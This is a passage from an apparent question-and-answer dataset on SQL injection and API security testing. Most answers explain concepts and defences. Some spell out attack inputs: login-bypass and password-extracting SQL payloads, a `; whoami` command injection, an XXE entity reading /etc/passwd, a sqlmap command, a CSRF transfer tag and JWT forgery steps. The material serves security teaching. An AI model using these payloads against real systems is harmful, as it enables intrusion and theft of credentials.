Answer: A "zero-day" would typically refer to a previously unknown vulnerability in a popular application, plugin, or database system that can be exploited via SQL injection. It means the vulnerability is being exploited before a patch is available.

---

Question: Why is it important to log SQL queries for security?
Answer: Logging executed queries, especially those that result in an error, is crucial for incident response. These logs can help investigators understand exactly what an attacker did, what data they accessed, and how to fix the vulnerability.

---

Question: How can a code review process help prevent SQLi?
Answer: A thorough, manual or automated code review process can identify areas in the code where developers are using unsafe practices, like string concatenation in queries. This allows vulnerabilities to be found and fixed before the code is deployed.

---

### Category: Esoteric & Advanced Concepts

Question: What is a differential injection?
Answer: This is another technical term for a content-based blind SQLi, where the attacker observes the "difference" in the page content to infer the boolean result of an injected query.

---

Question: Can SQLi occur through a DNS query?
Answer: This is a highly unusual but theoretically possible attack vector. It would require a misconfigured DNS server that logs queries to a vulnerable SQL database, allowing for injection through a crafted domain name lookup.

---

Question: What is a "SQL Truncation Attack"?
Answer: This is an attack where the database truncates (shortens) user-provided data that is too long for a column. This can be abused during registration to create an account with a name that collides with a privileged one, like 'admin'.

---

Question: How can SQL injection be used to create a Denial of Service (DoS)?
Answer: An attacker can inject resource-intensive queries, like the `BENCHMARK()` function in MySQL, that consume all the database's CPU or memory. This makes the database unavailable to legitimate users.

---

Question: What is a "data-only" attack in the context of SQLi?
Answer: A data-only attack is one where the goal is not to steal data but to subtly manipulate it for the attacker's benefit. For example, injecting a query that applies a 100% discount to an e-commerce order.

---

Question: What is the difference between `CHAR()` and `CONCAT()` in a WAF bypass?
Answer: `CONCAT()` is used to join strings together. `CHAR()` is used to generate a character from its ASCII value. An attacker might use `CHAR()` to construct a blocked keyword like `SELECT` from character codes to evade a WAF.

---

Question: How can SQL session variables be abused?
Answer: In MySQL, an attacker can set user-defined variables (e.g., `@a:=...`) to store data temporarily during a complex, multi-stage data exfiltration process, making the attack easier to manage.

---

Question: What is a "false positive" in an automated SQLi scan?
Answer: A false positive is when an automated scanner incorrectly reports a SQL injection vulnerability that does not actually exist, often by misinterpreting an application's unusual response.

---

Question: What is a "false negative" in an automated SQLi scan?
Answer: A false negative is when an automated scanner fails to detect a real SQL injection vulnerability. This often happens with complex, second-order, or heavily filtered vulnerabilities that require human logic to find.

---

Question: What is "SQL collation"?
Answer: Collation is a set of rules for how data is sorted and compared in a database. In some rare cases, a specific collation might treat certain characters as equivalent, which could potentially be abused to bypass a simple security filter.

---

Question: Can SQLi occur in an `UPDATE` statement's `SET` clause?
Answer: Yes. If user input controls the value being set, an attacker could inject a subquery. For example, they could set their own password to be equal to the admin's password: `SET password = (SELECT password FROM users WHERE username='admin')`.

---

Question: What is a "polyglot" injection payload?
Answer: A polyglot payload is a single string that is a valid attack for multiple different contexts at once. For example, a string that is both valid JavaScript for XSS and also contains valid SQL syntax for SQLi.

---

Question: Can you get SQLi through an integer-based parameter?
Answer: Yes. If the application code doesn't strictly enforce the integer type before using it in a query, it's vulnerable. Even if it does, it might return different errors for strings vs. integers, which can be used for blind injection.

---

Question: What is "SQL sharding"?
Answer: Sharding is a database architecture pattern for horizontally partitioning a large database into smaller, faster, more manageable parts called shards. It is a design principle and not directly related to injection vulnerabilities.

---

Question: How can the `PIVOT` operator in SQL Server be abused?
Answer: The `PIVOT` operator is a complex function for transforming data. If user input is allowed within its definition without strict sanitization, it could potentially lead to an injection vulnerability, though this is a very rare and specific scenario.

---

Question: What is the significance of the `mysql_real_escape_string` function?
Answer: This was a common PHP function for escaping SQL input. It is now deprecated and is often a sign of old, likely vulnerable legacy code, as it was frequently misused (e.g., with the wrong character set).

---

Question: Can you inject into a `TRUNCATE` statement?
Answer: No. The `TRUNCATE TABLE` command does not accept a `WHERE` clause or any parameters, so there is no place for user input to be injected. An attacker would need to use a stacked query to execute it.

---

Question: What is "taint analysis"?
Answer: Taint analysis is a form of static code analysis where a tool marks "tainted" data (all user input) and tracks it as it flows through the application. If this tainted data ever reaches a dangerous function (a "sink") like a database query without being sanitized, the tool flags a potential vulnerability.

---

Question: How does HTTP Parameter Pollution (HPP) relate to SQLi?
Answer: HPP is an attack where an attacker submits multiple HTTP parameters with the same name. This can be used to bypass a WAF by splitting a malicious SQL payload across two parameters, which are then concatenated by a vulnerable backend technology.

---

Question: What is the most important mindset for a security tester looking for SQLi?
Answer: The most important mindset is curiosity and persistence. A tester must treat every single piece of user-controllable input—including URLs, form fields, HTTP headers, and cookies—as a potential attack vector and methodically test how the application handles unexpected and malicious data.

---

Question: What is a REST API?
Answer: A REST (Representational State Transfer) API is an architectural style for designing networked applications. It uses a stateless, client-server model where resources are identified by URLs (endpoints). It relies on standard HTTP methods like GET, POST, PUT, DELETE, and PATCH to perform operations on these resources.

---

Question: What is a GraphQL API?
Answer: GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data. Unlike REST, which has multiple endpoints, GraphQL typically exposes a single endpoint. It allows the client to request exactly the data it needs, which can prevent over-fetching and under-fetching of data.

---

Question: What is the difference between an API endpoint and a URL?
Answer: A URL (Uniform Resource Locator) is a full web address that specifies the location of a resource. An API endpoint is a specific URL within an API that a client can interact with to access a particular function or resource. For example, `https://api.example.com/users/123` is an endpoint within the `/users` resource.

---

Question: What are the most common HTTP methods used in REST APIs?
Answer: The most common HTTP methods are:
- GET: To retrieve data from a resource.
- POST: To create a new resource.
- PUT: To update an existing resource completely.
- DELETE: To remove a resource.
- PATCH: To partially update an existing resource.

---

Question: What is a JSON Web Token (JWT)?
Answer: A JWT is a compact, URL-safe standard for creating access tokens that assert some number of claims. A JWT is composed of three parts separated by dots: a header, a payload, and a signature. The signature is used to verify that the token has not been tampered with.

---

Question: What is the difference between HTTP and HTTPS?
Answer: HTTP (Hypertext Transfer Protocol) is the protocol for transmitting web data. HTTPS (HTTP Secure) is the secure version of HTTP. It encrypts the communication between the client and the server using TLS/SSL, protecting the data from eavesdropping and man-in-the-middle attacks. All APIs should use HTTPS.

---

Question: What is an API key?
Answer: An API key is a simple token that is used to identify the calling application or user. It is typically passed in an HTTP header (e.g., `X-API-Key`) or a query parameter. It is a form of authentication but is generally considered less secure than protocols like OAuth.

---

Question: What is OAuth 2.0?
Answer: OAuth 2.0 is an authorization framework that enables applications to obtain limited access to user accounts on an HTTP service. It works by delegating user authentication to the service that hosts the user account, and authorizing third-party applications to access the user account.

---

Question: What does it mean for an API to be 'stateless'?
Answer: A stateless API is one where the server does not store any information about the client's session state between requests. Each request from a client to the server must contain all the information needed to understand and process the request, such as an authentication token.

---

Question: What is API versioning and why is it important?
Answer: API versioning is the practice of managing changes to an API. It is important because it allows developers to introduce new features or breaking changes without disrupting existing client applications. Common versioning strategies include URI path versioning (e.g., `/api/v2/users`) and header versioning.

---

### Category: OWASP API Security Top 10

Question: What is the OWASP API Security Top 10?
Answer: It is a standard awareness document that lists the ten most critical security risks for APIs. It provides a framework for developers and security professionals to secure their modern API architectures.

---

Question: What is API1:2023 - Broken Object Level Authorization (BOLA)?
Answer: BOLA, also known as IDOR, is the most common and severe API vulnerability. It occurs when an API endpoint allows an authenticated user to access or modify data objects for which they are not authorized, simply by changing the ID in the request (e.g., `/api/users/123` to `/api/users/456`).

---

Question: What is API2:2023 - Broken Authentication?
Answer: This category covers vulnerabilities in how an API authenticates users. It includes weak password policies, allowing credential stuffing or brute-force attacks, improper handling of JWTs (like not validating the signature), and insecure password recovery mechanisms.

---

Question: What is API3:2023 - Broken Object Property Level Authorization?
Answer: This is a more granular version of BOLA. It occurs when a user is authorized to access an object but can access or modify specific properties (fields) of that object that should be restricted. For example, a regular user being able to update the `isAdmin` property on their own user object. This is often exploited via Mass Assignment.

---

Question: What is API4:2023 - Unrestricted Resource Consumption?
Answer: This vulnerability occurs when an API does not properly restrict the size or number of resources that can be requested by a client. This can lead to Denial of Service (DoS) attacks, where an attacker overwhelms the server with requests for large files, complex GraphQL queries, or a high volume of API calls due to missing rate limiting.

---

Question: What is API5:2023 - Broken Function Level Authorization (BFLA)?
Answer: BFLA occurs when an API fails to check if a user has the necessary permissions to perform a specific action, especially administrative ones. For example, a regular user being able to successfully call an admin-only endpoint like `DELETE /api/admin/deleteUser`.

---

Question: What is API6:2023 - Unrestricted Access to Sensitive Business Flows?
Answer: This vulnerability is about attackers abusing legitimate business logic. For example, an e-commerce site might have a business flow for purchasing a product. An attacker could automate this flow to buy up all the stock of a limited-edition item before real users can, or abuse a "refer a friend" feature to create millions of fake accounts for a reward.

---

Question: What is API7:2023 - Server-Side Request Forgery (SSRF)?
Answer: SSRF occurs when an API endpoint allows an attacker to trick the server into making an HTTP request to an arbitrary domain. This can be used to scan the internal network, attack internal services, or query cloud provider metadata endpoints to steal credentials.

---

Question: What is API8:2023 - Security Misconfiguration?
Answer: This is a broad category that covers security flaws resulting from improper configuration. Examples include unnecessary HTTP methods being enabled on an endpoint, missing security headers (like HSTS), overly permissive CORS policies, and verbose error messages that leak sensitive information.

---

Question: What is API9:2023 - Improper Inventory Management?
Answer: This vulnerability is about the failure to properly manage the entire API landscape. It includes exposing old, unpatched API versions (e.g., `/api/v1`), development or staging endpoints being left open to the public, and not properly documenting or retiring old endpoints.

---

Question: What is API10:2023 - Unsafe Consumption of APIs?
Answer: This category is unique as it focuses on how an application *consumes* third-party APIs. It includes risks like not validating data received from an external API (which could lead to injection), trusting external APIs with sensitive data, and not handling redirects from them securely.

---

### Category: Authentication & Authorization Testing

Question: How do you test a JWT for signature validation?
Answer: You can test this by taking a valid JWT, decoding it, changing a value in the payload (e.g., change your username to "admin"), and then changing the algorithm in the header to "none". If you then re-encode the token and the server accepts it, it is critically vulnerable.

---

Question: How do you test for weak password policies on a registration endpoint?
Answer: Attempt to create new users with very weak passwords, such as "12345", "password", or a single character. If the API accepts these passwords, it has a weak password policy.

---

Question: What is a test for insecure direct password reset?
Answer: In a password reset flow, if the API endpoint includes something predictable like the user's ID or email in the reset link (e.g., `/reset?user_id=123`), an attacker can simply guess the ID of another user to take over their account. Reset tokens should be long and random.

---

Question: How can you test for missing rate limiting on a login endpoint?
Answer: Use a tool like Burp Intruder or a custom script to send hundreds or thousands of login attempts with different passwords to the login endpoint in a short period. If the API does not block or slow down your requests, it is missing rate limiting and is vulnerable to brute-force attacks.

---

Question: How do you test an API key for excessive permissions?
Answer: Once you have an API key, use it to try to access endpoints and perform actions that the user should not be authorized to do. For example, if it's a "read-only" key, try to make POST or DELETE requests.

---

Question: What is a "replay attack" against an API?
Answer: A replay attack is when an attacker intercepts a valid request (e.g., a request to transfer money) and then "replays" or resends that same request multiple times to repeat the action without proper authorization. APIs should have measures to prevent this, like using nonces.

---

Question: How do you test for session termination vulnerabilities?
Answer: After logging a user out of the application, capture the session token or JWT that was used. Then, try to use that same token to access a protected endpoint. If the request is successful, the session was not properly invalidated on the server side.

---

Question: How do you test an OAuth 2.0 implementation for the "Implicit Grant" flow vulnerability?
Answer: The Implicit Grant flow is now considered insecure because it returns the access token directly in the browser's URL fragment. If an application is using this, an attacker could potentially steal the token through a compromised browser extension or a referer header leak.

---

Question: How to test for Broken Object Level Authorization (BOLA/IDOR)?
Answer: You need two user accounts, User A and User B. Log in as User A and perform an action on one of your objects, like viewing an order (`GET /api/orders/101`). Capture this request. Now, log in as User B, and replay the request for User A's order. If you can see the data, the endpoint is vulnerable.

---

Question: How do you test for Broken Function Level Authorization (BFLA)?
Answer: First, map out the API as a regular user. Then, try to guess the URLs for administrative endpoints, such as `/api/admin/users`, `/api/v2/promoteUser`, or changing the HTTP method from GET to POST on an endpoint. If any of these requests succeed, a BFLA vulnerability exists.

---

### Category: Input & Data Validation Testing

Question: How do you test an API endpoint for command injection?
Answer: Find an endpoint that takes input which might be passed to a system command (e.g., a filename for processing). Inject command separators like `;`, `|`, or `&&` followed by an OS command (e.g., `filename.txt; whoami`). If the command executes, it is vulnerable.

---

Question: How do you test an API for SQL injection?
Answer: Find endpoints that take an ID or other parameter that is likely used in a database query (e.g., `/api/products/123`). Inject SQL syntax like a single quote (`'`) to see if it causes an error, or a time-based payload (`123' AND SLEEP(5)--`) to see if the response is delayed.

---

Question: How can you test a GraphQL endpoint for batching attacks?
Answer: GraphQL allows you to "batch" multiple queries into a single HTTP request. An attacker can abuse this by sending a request containing hundreds or thousands of queries, potentially overwhelming the server. Test by sending a large array of queries in a single POST request.

Question: How do you test for Mass Assignment?
Answer: First, observe a normal request, like a user profile update (`{"name": "test"}`). Then, try to guess and add other properties to the JSON body that might exist on the backend object, such as `{"name": "test", "isAdmin": true, "credits": 99999}`. If the response shows these properties were updated, it is vulnerable.

---

Question: How can you test for Verbose Error Messages?
Answer: Send malformed requests to various endpoints: incorrect data types, missing parameters, invalid JSON, etc. Examine the error responses. If they contain stack traces, internal function names, database query snippets, or other internal information, this is a security misconfiguration.

---

Question: How do you test for XXE injection in an API that accepts XML?
Answer: If an endpoint accepts XML data (`Content-Type: application/xml`), modify the request to include a malicious DTD that defines an external entity pointing to a local file, like `<!ENTITY xxe SYSTEM "file:///etc/passwd">`. Then, reference that entity in the XML body (`&xxe;`).

---

Question: How do you test for Insecure Deserialization?
Answer: This is an advanced attack. If you know the language and framework the API is built on, you can craft a serialized object in that language containing a malicious payload. When the API deserializes this object, the payload executes. This often involves using tools like `ysoserial`.

---

Question: How do you test an API that accepts file uploads for vulnerabilities?
Answer: Test by uploading files with different extensions (e.g., `.php`, `.jsp`, `.exe`), files that are very large (to test for resource consumption), files with malicious content (like a web shell), and files with path traversal sequences in the filename (`../../shell.php`).

---

Question: What is parameter pollution and how do you test for it?
Answer: HTTP Parameter Pollution (HPP) is when you send multiple parameters with the same name. For example, `/api/search?user_id=123&user_id=456`. Some backends will only process the first, some the last, and some both. This can be used to bypass WAFs or override application logic. Test by duplicating parameters in your requests.

---

Question: How do you test a GraphQL endpoint for excessive errors?
Answer: Send a GraphQL query that intentionally asks for a non-existent field. If the error response reveals a lot of information about the schema, this can be a form of information leakage.

---

### Category: Logic & Process Testing

Question: How do you test for race conditions in an API?
Answer: Find an endpoint that performs a multi-step operation, like "check balance, then withdraw". Use a tool like Burp Turbo Intruder to send two withdrawal requests at almost exactly the same time. If both requests succeed even if there were only funds for one, a race condition exists.

---

Question: How would you test a "refer a friend" feature for abuse?
Answer: Attempt to automate the process of creating new accounts using your referral code. If there is no rate limiting, no CAPTCHA, and no validation on the new accounts, you can likely abuse the feature to gain a large number of referral bonuses.

---

Question: How do you test a coupon code feature for flaws?
Answer: Try to reuse the same coupon code multiple times. Try to apply a discount coupon to an item that is already on sale. Try to guess the format of coupon codes to find new ones. Try to apply a very large negative-value coupon.

---

Question: What is a test for API response manipulation?
Answer: In some cases, the client-side application might make security decisions based on the API's response. For example, if the API returns `{"isAdmin": false}`, the UI hides the admin button. Use a proxy like Burp Suite to intercept the response and change it to `{"isAdmin": true}` to see if you can unlock features on the client side.

---

Question: How do you test for an insecure API redirect?
Answer: If an API uses redirects (e.g., for authentication), check if the redirect URL can be controlled by a parameter. If so, try to redirect users to a malicious website. This is an "Open Redirect" vulnerability.

---

Question: How do you test for business logic flaws in a checkout process?
Answer: Manipulate the process in unexpected ways. For example, add a very expensive item to your cart, then apply a coupon, then change the quantity of the expensive item to zero. See if the coupon discount still applies to the remaining cheap items.

---

Question: How to test for API key leakage?
Answer: API keys are sometimes leaked in the client-side JavaScript code of a web application, in mobile app binaries, or in public GitHub repositories. Use tools to decompile mobile apps and search GitHub for the company's name or URL along with the term "API key".

---

Question: How do you test for denial of service through regex?
Answer: If an API uses a regular expression to validate input, it might be vulnerable to ReDoS (Regular Expression Denial of Service). This occurs when the regex is poorly written, and a specially crafted input string can cause it to take an extremely long time to evaluate.

---

Question: How do you find undocumented API endpoints?
Answer: Use directory bruteforcing tools (like dirsearch or ffuf) against the API domain. Look through the JavaScript files of the web application for hidden API calls. Monitor the network traffic of the mobile app.

---

Question: How do you test for information leakage in API responses?
Answer: Examine every API response carefully. Look for sensitive information that should not be there, such as internal IP addresses, user emails or PII, configuration details, or other users' data.

---

### Category: Configuration & Infrastructure Testing

Question: What security headers are important to check for in API responses?
Answer: Key headers include `Strict-Transport-Security` (HSTS) to enforce HTTPS, `Content-Security-Policy` (CSP) to prevent XSS, `X-Content-Type-Options: nosniff` to prevent MIME-sniffing, and `X-Frame-Options` to prevent clickjacking.

---

Question: How do you test an API for old, unpatched versions?
Answer: If the current API is `/api/v3/users`, always test for the existence of `/api/v2/users` and `/api/v1/users`. These older versions are often forgotten and may contain known vulnerabilities that have been fixed in the latest version.

---

Question: How do you test for a CORS misconfiguration?
Answer: Make a request to the API from a different origin (e.g., using a tool or a custom HTML file). Check the `Access-Control-Allow-Origin` header in the response. If it reflects your arbitrary origin, or if it is a wildcard (`*`) on an authenticated endpoint, it is misconfigured.

---

Question: How do you check if an API is exposing unnecessary HTTP methods?
Answer: For a given endpoint (e.g., `/api/users/123`), send a request with the `OPTIONS` HTTP method. The `Allow` header in the response will list all the enabled methods. If you see methods like `DELETE` or `PUT` on an endpoint that should be read-only, this is a misconfiguration.

---

Question: How do you test if an API is vulnerable to Host Header Injection?
Answer: Send a request to the API, but modify the `Host` header to point to an attacker-controlled domain. If the application uses this header to generate links (e.g., in a password reset email), an attacker can poison those links.

---

Question: What is the risk of an API not having a `Cache-Control` header?
Answer: If an API response containing sensitive data is missing a header like `Cache-Control: no-store`, it might be cached by the browser or an intermediary proxy. This could lead to that sensitive data being leaked to another user.

---

Question: How do you test for default credentials on an API's infrastructure?
Answer: An API is often supported by other services, like a database, a message queue, or a monitoring dashboard. It is important to check if these related services are exposed and if they are using default credentials (e.g., "admin":"admin").

---

Question: How can you find sensitive data in public documentation?
Answer: If the API has public documentation (e.g., a Swagger or OpenAPI file), examine it carefully. Sometimes developers accidentally leave internal API endpoints, sample API keys, or other sensitive information in the documentation.

---

Question: What is a test for stack trace exposure?
Answer: Send a deliberately malformed request that is likely to cause an unhandled exception in the application. For example, if an ID is an integer, send a very large number that will cause an overflow. If the API returns a full stack trace, it's a vulnerability.

---

Question: How to test an API for unprotected metadata endpoints?
Answer: If the API is hosted on a cloud provider (AWS, GCP, Azure), you can test for SSRF by trying to make the API request the cloud metadata service URL (e.g., `http://169.254.169.254`). If successful, this can expose cloud credentials.

---

### Category: GraphQL Specific Testing

Question: How do you perform introspection on a GraphQL API?
Answer: GraphQL has a built-in feature called introspection, which allows you to query the API for its own schema. If this is enabled in production, an attacker can send an introspection query to get a complete map of all available types, queries, and mutations, making it much easier to find vulnerabilities.

---

Question: How do you test for deep recursion in a GraphQL query?
Answer: If the GraphQL schema allows for nested relationships (e.g., a user has friends, who also have friends), an attacker can craft a deeply nested query. Send a query that is nested 10-20 levels deep to see if it causes a Denial of Service.

---

Question: What is a test for GraphQL query cost analysis?
Answer: A secure GraphQL API should have query cost analysis to prevent expensive queries. Test this by sending a query that asks for a very large number of items on a list, for example `users(first: 10000) { id name }`. If the API tries to fulfill this, it is likely vulnerable.

---

Question: How do you test for batching attacks in GraphQL?
Answer: GraphQL allows for multiple queries to be sent in a single HTTP request. Send a request containing an array of hundreds of queries to see if the server has a limit on how many it will process at once.

---

Question: How are authorization and authentication different in GraphQL?
Answer: Authentication is the same: the user must present a token to prove their identity. Authorization is more complex. Because a single query can access multiple different types of data, authorization checks need to be performed at the resolver level for each field, not just at the main endpoint.

---

Question: What is a GraphQL alias abuse attack?
Answer: GraphQL allows you to use aliases to request the same field multiple times in a single query. An attacker can abuse this by sending a query that requests the same resource hundreds of times using different aliases, potentially causing a DoS. Example: `{ user1: user(id:1){id}, user2: user(id:1){id}, ... }`.

---

Question: How can you test for information leakage in GraphQL error messages?
Answer: Send a syntactically correct but semantically incorrect query (e.g., ask for a field that doesn't exist). Examine the error message. If it provides detailed suggestions, stack traces, or internal server information, this is a vulnerability.

---

Question: How do you test for mutations that lack proper authorization?
Answer: Once authenticated as a regular user, use an introspection query (if available) to find the names of all available mutations. Then, attempt to execute every single mutation, especially ones that sound administrative like `createUser`, `deleteProduct`, or `changePermissions`.

---

Question: What is the difference between a Query, a Mutation, and a Subscription in GraphQL?
Answer: A Query is used for reading data (like a GET request). A Mutation is used for writing data (like a POST or PUT request). A Subscription is a long-lived connection used for receiving real-time data from the server.

---

Question: How do you test a GraphQL API for CSRF vulnerabilities?
Answer: Unlike REST, GraphQL APIs that only accept `Content-Type: application/json` are generally not vulnerable to traditional CSRF attacks from a web browser. However, it is still important to check if the server allows other content types.

---

### Category: Tooling & Methodology

Question: What is the first step in testing an API?
Answer: The first step is always mapping and exploration. You need to understand how the API works. Use the application as a normal user with a proxy like Burp Suite running to capture all the API requests and build a map of the endpoints, parameters, and authentication mechanisms.

---

Question: What is the role of Postman in API testing?
Answer: Postman is an API client that is excellent for exploring and interacting with an API in a controlled way. It's used to craft and send legitimate requests, organize them into collections, and understand the expected functionality before you start security testing.

---

Question: What is the role of Burp Suite in API testing?
Answer: Burp Suite is a security testing tool. It acts as an intercepting proxy, allowing you to capture requests made by the application or Postman and then modify (tamper with) them to test for vulnerabilities like IDOR, injection, and authorization flaws.

---

Question: What is Kiterunner?
Answer: Kiterunner is a powerful tool specifically designed for API security testing. It can take a large wordlist of potential endpoint paths and perform a content-aware bruteforce to discover hidden or unlinked API endpoints.

---

Question: What is a Swagger or OpenAPI file?
Answer: A Swagger or OpenAPI file is a specification document that describes a REST API. It defines all the available endpoints, parameters, expected responses, and authentication methods. It is an invaluable resource for both developers and security testers.

---

Question: What is "shifting left" in API security?
Answer: "Shifting left" refers to the practice of integrating security testing into the earliest stages of the software development lifecycle (SDLC). For APIs, this means performing security design reviews, using static analysis tools, and automating security tests in the CI/CD pipeline, rather than waiting until the end.

---

Question: What is the difference between DAST and SAST for API testing?
Answer: DAST (Dynamic Application Security Testing) tools, like Burp Scanner, test the running API from the outside in, sending malicious requests to find vulnerabilities. SAST (Static Application Security Testing) tools analyze the API's source code from the inside out to find potential security flaws before the code is even compiled.

---

Question: Why is it important to test both authenticated and unauthenticated endpoints?
Answer: You must test both. Unauthenticated endpoints should be tested for information leakage and to ensure they do not grant any unauthorized access. Authenticated endpoints must be tested for all authorization flaws, like BOLA and BFLA, to ensure one user cannot access another user's data.

---

Question: What is the value of creating a testing methodology or checklist?
Answer: A structured methodology or checklist ensures that your testing is consistent, repeatable, and comprehensive. It helps you remember to test for all the common vulnerability types on every endpoint and reduces the chance of missing a critical flaw.

---

Question: What is the most important skill for an API security tester?
Answer: Beyond technical knowledge, the most important skill is a curious and methodical mindset. A good tester must be able to understand the business logic of the API, think like an attacker, and creatively explore how the application can be abused in ways the developers never intended.

---

Question: What is Cross-Site Request Forgery (CSRF)?
Answer: Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user into submitting a malicious request to a web application they are currently logged into. For example, an attacker could embed an image tag on a forum they control: `<img src="http://your-bank.com/transfer?to=attacker&amount=1000">`. If a logged-in user of the bank visits the forum, their browser will automatically make that request with their session cookies, transferring the money without their knowledge. Modern web frameworks often have built-in CSRF token protection to prevent this.

---

Question: What are the main risks of a file upload feature?
Answer: Unrestricted file uploads are a critical vulnerability. The primary risk is an attacker uploading a web shell (e.g., a `.php`, `.jsp`, or `.aspx` file) disguised as an image or document. If the attacker can then execute this file on the server, they gain Remote Code Execution (RCE) and can take full control of the web server. Other risks include path traversal in the filename to overwrite critical system files, and uploading files that can cause a Denial of Service (e.g., a "zip bomb").

---

Question: What is the primary goal of a basic SQL injection test?
Answer: The primary goal of a basic SQL injection test is to determine if user-supplied input is being improperly included in a database query. A successful test can manipulate the query's logic, often by injecting characters like a single quote (') or logical statements like 'OR 1=1', to bypass security or extract data.

---

Question: Provide a classic payload for bypassing a login form and explain why it works.
Answer: The classic login bypass payload is ' OR 1=1 --. When entered into the username field, it transforms the backend SQL query into something like: SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'some_password'. The 'OR 1=1' part makes the WHERE clause always true, and the '--' comments out the rest of the line, ignoring the password check entirely.

---

Question: What is the main difference between Union-based SQLi and Blind SQLi?
Answer: In Union-based SQLi, the attacker can use the UNION SQL operator to combine the results of the original query with a new, malicious query, and the application displays the combined results directly on the page. In Blind SQLi, the application does not return any data in its response. The attacker must infer information by asking the database a series of True/False questions, often by observing time delays or subtle changes in the page.

---

Question: What is the most important command to start with when using the sqlmap tool?
Answer: The most important starting command for sqlmap is specifying the target URL with a vulnerable parameter. For example: `sqlmap -u "http://testsite.com/products.php?id=1" --dbs`. This command tells sqlmap to test the 'id' parameter at the given URL and, if successful, attempt to enumerate the databases.

---


Question: What is the difference between Authentication (AuthN) and Authorization (AuthZ) in API security?
Answer: Authentication (AuthN) is the process of verifying who a user is, typically by checking a username/password, API key, or token. Authorization (AuthZ) is the process of verifying what that authenticated user is allowed to do. A common vulnerability is Broken Object Level Authorization (BOLA/IDOR), where the API authenticates the user but fails to authorize if they can access a specific resource.

---

Question: How do you manually test for an IDOR (Insecure Direct Object Reference) vulnerability in an API?
Answer: To test for IDOR, you need two different user accounts, User A and User B. First, log in as User A and access a resource specific to that user, like `/api/users/12345/orders/501`. Copy this URL. Now, log out and log in as User B. Attempt to access the exact same URL. If User B can see or modify User A's order, a critical IDOR vulnerability exists.

---

Question: What is a common vulnerability to check for in a JSON Web Token (JWT)?
Answer: A common and critical vulnerability to check for in a JWT is the "alg:none" signing algorithm vulnerability. An attacker can take a valid JWT, decode the payload, change the user ID or role (e.g., to 'admin'), and then change the algorithm in the header to "none". If the server accepts this token without a signature, the attacker gains unauthorized access.

---

Question: What does it mean if an API endpoint is missing rate limiting and why is it a risk?
Answer: An API endpoint missing rate limiting allows an attacker to make an unlimited number of requests in a short period. This is a risk for several reasons: it can be used for brute-force attacks on login credentials, it can be used to scrape large amounts of user data, and it can lead to a Denial of Service (DoS) by overwhelming the server with requests.

---

Question: What are Postman and Burp Suite used for in API testing?
Answer: Postman is primarily an API client used for building and sending valid API requests to test functionality and performance. It's excellent for understanding how an API is supposed to work. Burp Suite is a web application security testing tool. It acts as a proxy, intercepting requests (including those from Postman) and allowing a security tester to tamper with them to find vulnerabilities like IDOR, injection flaws, and authorization issues.

---

Question: What is Cross-Site Scripting (XSS) and how does it differ from SQL Injection?
Answer: Cross-Site Scripting (XSS) is a client-side vulnerability where an attacker injects malicious scripts (usually JavaScript) into a web page viewed by other users. This script then runs in the victim's browser, allowing the attacker to steal cookies, hijack sessions, or deface websites. It differs from SQL Injection, which is a server-side vulnerability that targets the database. XSS targets the user, while SQLi targets the database server.

---

Question: What is an XML External Entity (XXE) attack?
Answer: An XXE attack is a vulnerability in an application that parses XML input. If the XML parser is poorly configured, an attacker can embed a malicious external entity in the XML data. When the application processes this XML, the external entity can be used to read sensitive files from the server's local filesystem (e.g., /etc/passwd), or cause a Denial of Service.

---

Question: How can you prevent XXE vulnerabilities?
Answer: The best way to prevent XXE is to disable Document Type Definitions (DTDs) and external entities completely in your XML parser. Almost all modern XML parsing libraries have a simple configuration option to disable these features, which are rarely needed for typical application functions.

---

Question: Explain a Second-Order SQL Injection attack.
Answer: A Second-Order SQL Injection occurs when malicious user input is stored by the application and then used in a later, separate database query in an unsafe way. For example, a user might register a malicious username. The application may safely store it initially, but later, an admin panel might pull that username and use it in a vulnerable query, triggering the injection. It's harder to detect because the initial request appears harmless.

---

Question: What is an Out-of-Band SQL Injection attack?
Answer: Out-of-Band (OOB) SQL Injection is an advanced technique used when an attacker cannot get a direct response from the server, even through time delays. The attacker injects a payload that forces the database server to make an external network connection to a server they control. A common method is triggering a DNS lookup to a unique domain, which proves the vulnerability is present.

---

Question: What are some important HTTP security headers to check for when testing an API?
Answer: Key security headers for APIs include: `Strict-Transport-Security` (HSTS) to enforce HTTPS, `X-Content-Type-Options: nosniff` to prevent MIME-sniffing attacks, `Content-Security-Policy` (CSP) to restrict which resources can be loaded, and `X-Frame-Options` to prevent clickjacking, although the latter is more for browser-based UIs.

---

Question: Why is 'Improper Assets Management' a risk for APIs?
Answer: Improper Assets Management refers to risks like exposing old, unpatched, or development API endpoints to the public internet (e.g., /api/v1, /api/v2-dev). These forgotten endpoints often lack the security hardening of the production API and can provide an easy entry point for attackers to compromise the entire system.

---

Question: How can a GraphQL API be abused if not properly secured?
Answer: A common way to abuse a GraphQL API is through resource exhaustion. Unlike REST, a client can request a large amount of nested data in a single query. Without protections like query depth limiting, timeouts, or query cost analysis, an attacker can send a complex, deeply nested query that overwhelms the server, leading to a Denial of Service.

---

Question: What is a Server-Side Request Forgery (SSRF) vulnerability in the context of an API?
Answer: An SSRF vulnerability in an API occurs when an attacker can trick the server-side application into making an HTTP request to an arbitrary domain of their choosing. This can be used to pivot and attack internal network services that are normally protected by a firewall, scan internal ports, or query cloud provider metadata endpoints to steal credentials.

---

Question: Can you provide a list of common SQL injection payloads for testing?
Answer: Yes. Payloads are chosen based on the context of the injection point and the desired outcome. Here are several fundamental types with examples:
1. Tautology (for bypassing logins or conditions): `' OR 1=1 --`
2. Union-based (for retrieving data): `' UNION SELECT username, password FROM users--`
3. Error-based (to reveal database information): `' AND 1=CONVERT(int, (SELECT @@version))--`
4. Time-based Blind (to infer information via delays): `' AND IF(version() LIKE '5%', SLEEP(5), 0)--`
5. Commenting out (to neutralize the rest of a query): `#` (MySQL), `--` (most SQL), `/* comment */` (universal).

---

Question: Explain in detail how to use a time-based blind SQL injection payload.
Answer: Time-based blind SQL injection is used when an application gives no different response whether a query is true or false. We must infer information by forcing the database to perform a time-consuming action, like sleeping.
Example Payload (for MySQL): `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--`
How it works:
1. The payload is injected into a parameter.
2. The `IF()` condition asks a True/False question. In this case, "Is the first character of the admin's password 'a'?".
3. If the answer is TRUE, the `SLEEP(5)` command is executed, and the application's response is delayed by 5 seconds.
4. If the answer is FALSE, the command does nothing, and the application responds instantly.
